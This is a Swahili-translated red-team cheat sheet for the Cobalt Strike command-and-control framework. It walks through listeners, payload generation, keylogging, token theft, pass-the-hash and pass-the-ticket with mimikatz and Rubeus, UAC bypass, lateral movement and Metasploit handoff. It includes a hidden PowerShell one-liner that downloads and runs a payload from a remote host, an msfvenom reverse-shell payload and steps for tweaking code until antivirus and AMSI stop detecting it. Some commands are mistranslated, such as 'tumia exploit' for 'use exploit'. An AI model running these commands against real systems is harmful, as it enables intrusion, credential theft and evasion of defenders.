# Cobalt Strike

### Wasikilizaji

### Wasikilizaji wa C2

`Cobalt Strike -> Wasikilizaji -> Ongeza/Hariri` kisha unaweza kuchagua mahali pa kusikiliza, aina gani ya beacon ya kutumia (http, dns, smb...) na zaidi.

### Wasikilizaji wa Peer2Peer

Beacons ya wasikilizaji hawa hazihitaji kuongea na C2 moja kwa moja, wanaweza kuwasiliana nayo kupitia beacons nyingine.

`Cobalt Strike -> Wasikilizaji -> Ongeza/Hariri` kisha unahitaji kuchagua beacons za TCP au SMB

* **Beacon ya TCP itaweka wasikilizaji kwenye bandari iliyochaguliwa**. Kwa kuunganisha kwenye beacon ya TCP tumia amri `connect <ip> <port>` kutoka kwa beacon nyingine
* **Beacon ya smb itasikiliza kwenye jina la pipename lililochaguliwa**. Kwa kuunganisha kwenye beacon ya SMB unahitaji kutumia amri `link [target] [pipe]`.

### Jenereta na Mwenyeji wa mizigo

#### Jenereta ya mizigo kwenye faili

`Mashambulizi -> Pakiti ->`&#x20;

* **`HTMLApplication`** kwa faili za HTA
* **`MS Office Macro`** kwa hati ya ofisi yenye macro
* **`Windows Executable`** kwa .exe, .dll au huduma .exe
* **`Windows Executable (S)`** kwa **stageless** .exe, .dll au huduma .exe (bora stageless kuliko staged, chini ya IoCs)

#### Jenereta na Mwenyeji wa mizigo

`Mashambulizi -> Web Drive-by -> Utoaji wa Wavuti ulioandikwa (S)` Hii itazalisha hati/utekelezaji wa kupakua beacon kutoka kwa cobalt strike katika muundo kama vile: bitsadmin, exe, powershell na python

#### Mwenyeji wa Mizigo

Ikiwa tayari una faili unayotaka kuwa mwenyeji kwenye seva ya wavuti, nenda tu kwa `Mashambulizi -> Web Drive-by -> Mwenyeji wa Faili` na chagua faili ya kuwa mwenyeji na mpangilio wa seva ya wavuti.

### Chaguo za Beacon

<pre class="language-bash"><code class="lang-bash"># Tekeleza .NET binary ya ndani
execute-assembly &#x3C;/path/to/executable.exe>

# Picha za skrini
printscreen    # Chukua picha moja kupitia njia ya PrintScr
screenshot     # Chukua picha moja
screenwatch    # Chukua picha za skrini za kawaida
## Nenda kwa View -> Screenshots kuwaona

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes kuona herufi zilizobonyezwa

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Ingiza hatua ya portscan ndani ya mchakato mwingine
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
# Ingiza moduli ya Powershell
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;andika amri za powershell hapa>

# Uigizaji wa mtumiaji
## Uzalishaji wa token na creds
make_token [DOMAIN\user] [password] # Unda token ili kujifanya kuwa mtumiaji kwenye mtandao
ls \\computer_name\c$ # Jaribu kutumia token uliyounda kufikia C$ kwenye kompyuta
rev2self # Acha kutumia token uliyounda na make_token
## Matumizi ya make_token husababisha tukio la 4624: Akaunti ilifanikiwa kuingia. Tukio hili ni la kawaida sana katika kikoa cha Windows, lakini linaweza kupunguzwa kwa kuchuja kwa Aina ya Kuingia. Kama ilivyotajwa hapo juu, inatumia LOGON32_LOGON_NEW_CREDENTIALS ambayo ni aina 9.

# UAC Bypass
elevate svc-exe &#x3C;wasikilizaji>
elevate uac-token-duplication &#x3C;wasikilizaji>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Chukua token kutoka kwa pid
## Kama make_token lakini unachukua token kutoka kwa mchakato
steal_token [pid] # Pia, hii ni muhimu kwa hatua za mtandao, sio hatua za ndani
## Kutoka kwa nyaraka za API tunajua kuwa aina hii ya kuingia "inaruhusu mtumaji kuiga token yake ya sasa". Ndio maana Beacon inasema Impersonated &#x3C;current_username> - inajifanya kuwa token yetu iliyokopwa.
ls \\computer_name\c$ # Jaribu kutumia token uliyounda kufikia C$ kwenye kompyuta
rev2self # Acha kutumia token kutoka kwa steal_token

## Zindua mchakato na sifa mpya
spawnas [domain\username] [password] [wasikilizaji] # Fanya hivyo kutoka kwenye saraka yenye ufikiaji wa kusoma kama: cd C:\
## Kama make_token, hii itazalisha tukio la Windows 4624: Akaunti ilifanikiwa kuingia lakini na aina ya kuingia 2 (LOGON32_LOGON_INTERACTIVE). Itaelezea mtumiaji anayepiga simu (TargetUserName) na mtumiaji anayejifanya (TargetOutboundUserName).

## Ingiza kwenye mchakato
inject [pid] [x64|x86] [wasikilizaji]
## Kutoka kwa mtazamo wa OpSec: Usifanye uingizaji wa msalaba-jukwaa isipokuwa unahitaji sana (k.m. x86 -> x64 au x64 -> x86).

## Pita hash
## Mchakato huu wa ubadilishaji unahitaji kurekebisha kumbukumbu ya LSASS ambayo ni hatua ya hatari sana, inahitaji mamlaka ya msimamizi wa ndani na sio rahisi ikiwa Protected Process Light (PPL) imeamilishwa.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pita hash kupitia mimikatz
mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
## Bila /run, mimikatz itazindua cmd.exe, ikiwa unatumia kama mtumiaji na Desktop, ataweza kuona kikao (ikiwa unatumia SYSTEM, unaendelea vizuri)
steal_token &#x3C;pid> #Chukua token kutoka kwa mchakato uliozalishwa na mimikatz

## Pita tiketi
## Omba tiketi
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
## Unda kikao kipya cha kuingia kutumia tiketi mpya (ili isiwafute zile zilizodhuriwa)
make_token &#x3C;domain>\&#x3C;username> DummyPass
## Andika tiketi kwenye mashine ya mshambuliaji kutoka kwa kikao cha poweshell &#x26; ipakie
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pita tiketi kutoka kwa SYSTEM
## Zalisha mchakato mpya na tiketi
execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Chukua token kutoka kwa mchakato huo
steal_token &#x3C;pid>

## Chukua tiketi + Pita tiketi
### Onyesha tiketi
execute-assembly C:\path\Rubeus.exe triage
### Pindua tiketi za kuvutia kwa luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowrap
### Unda kikao kipya cha kuingia, chukua luid na processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Ingiza tiketi katika kikao cha kuingia kilichozalishwa
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Hatimaye, iba alama kutoka kwa mchakato huo mpya
steal_token &#x3C;pid>

# Harakisha kwa Upande
## Ikiwa alama imeundwa, itatumika
jump [method] [target] [listener]
## Njia:
## psexec                    x86   Tumia huduma kuendesha kipande cha EXE cha Huduma
## psexec64                  x64   Tumia huduma kuendesha kipande cha EXE cha Huduma
## psexec_psh                x86   Tumia huduma kuendesha mstari mmoja wa PowerShell
## winrm                     x86   Endesha hati ya PowerShell kupitia WinRM
## winrm64                   x64   Endesha hati ya PowerShell kupitia WinRM

remote-exec [method] [target] [command]
## Njia:
<strong>## psexec                          Endesha kwa mbali kupitia Meneja wa Udhibiti wa Huduma
</strong>## winrm                           Endesha kwa mbali kupitia WinRM (PowerShell)
## wmi                             Endesha kwa mbali kupitia WMI

## Ili kutekeleza beacon na wmi (haipo katika amri ya jump) tu pakia beacon na kuitekeleza
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pita kikao kwa Metasploit - Kupitia msikilizaji
## Kwenye mwenyeji wa metaploit
msf6 > tumia exploit/multi/handler
msf6 exploit(multi/handler) > weka payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > weka LHOST eth0
msf6 exploit(multi/handler) > weka LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Kwenye cobalt: Wasikilizaji > Ongeza na weka Payload kuwa Foreign HTTP. Weka Mwenyeji kuwa 10.10.5.120, Bandari kuwa 8080 na bonyeza Hifadhi.
beacon> spawn metasploit
## Unaweza kuzindua vikao vya Meterpreter x86 tu na msikilizaji wa kigeni.

# Pita kikao kwa Metasploit - Kupitia kuingiza shellcode
## Kwenye mwenyeji wa metaploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## Chalaza msfvenom na andaa msikilizaji wa multi/handler

## Nakili faili ya bin kwenye mwenyeji wa cobalt strike
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin #Ingiza msikilizaji wa metasploit shellcode katika mchakato wa x64

# Pita kikao cha metasploit kwa cobalt strike
## Zalisha Beacon shellcode bila hatua, nenda kwa Mashambulizi > Pakiti > Windows Executable (S), chagua msikilizaji unaotaka, chagua Aina ya Matokeo kuwa Raw na chagua Tumia malipo ya x64.
## Tumia post/windows/manage/shellcode_inject katika metasploit kuingiza shellcode ya cobalt strike iliyozalishwa


# Kubadilisha Mwelekeo
## Fungua proxy ya socks kwenye timu ya seva
beacon> socks 1080

# Uunganisho wa SSH
beacon> ssh 10.10.17.12:22 jina_la_mtumiaji nywila</code></pre>

## Kuepuka AVs

### Kitu cha Sanaa

Kawaida katika `/opt/cobaltstrike/artifact-kit` unaweza kupata nambari na templeti zilizopangwa mapema (katika `/src-common`) za malipo ambayo cobalt strike itatumia kuzalisha beacons za binary.

Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) na mlango wa nyuma uliozalishwa (au tu na templeti iliyopangwa mapema) unaweza kugundua kinachosababisha defender kuzindua. Kawaida ni herufi. Kwa hivyo unaweza tu kurekebisha nambari ambayo inazalisha mlango wa nyuma ili herufi hiyo isionekane katika binary ya mwisho.

Baada ya kurekebisha nambari tu endesha `./build.sh` kutoka kwenye saraka ile ile na nakili folda ya `dist-pipe/` kwenye mteja wa Windows katika `C:\Tools\cobaltstrike\ArtifactKit`.
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
Usisahau kupakia script ya kushambulia kwa nguvu `dist-pipe\artifact.cna` ili kuonyesha Cobalt Strike kutumia rasilimali kutoka kwenye diski tunayotaka na sio zile zilizopakiwa.

### Jitihada za Rasilimali

Folda ya ResourceKit ina mifano ya malipo ya Cobalt Strike inayotegemea script ikiwa ni pamoja na PowerShell, VBA, na HTA.

Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) na mifano hii, unaweza kugundua ni nini kinachokataliwa na mfumo wa ulinzi (kama vile AMSI) na kubadilisha:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Kwa kubadilisha mistari iliyogunduliwa, mtu anaweza kuunda kigezo ambacho hakitakamatwa.

Usisahau kupakia script ya kushambulia `ResourceKit\resources.cna` ili kuonyesha Cobalt Strike kutumia rasilimali kutoka kwenye diski tunayotaka na sio zile zilizopakiwa.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

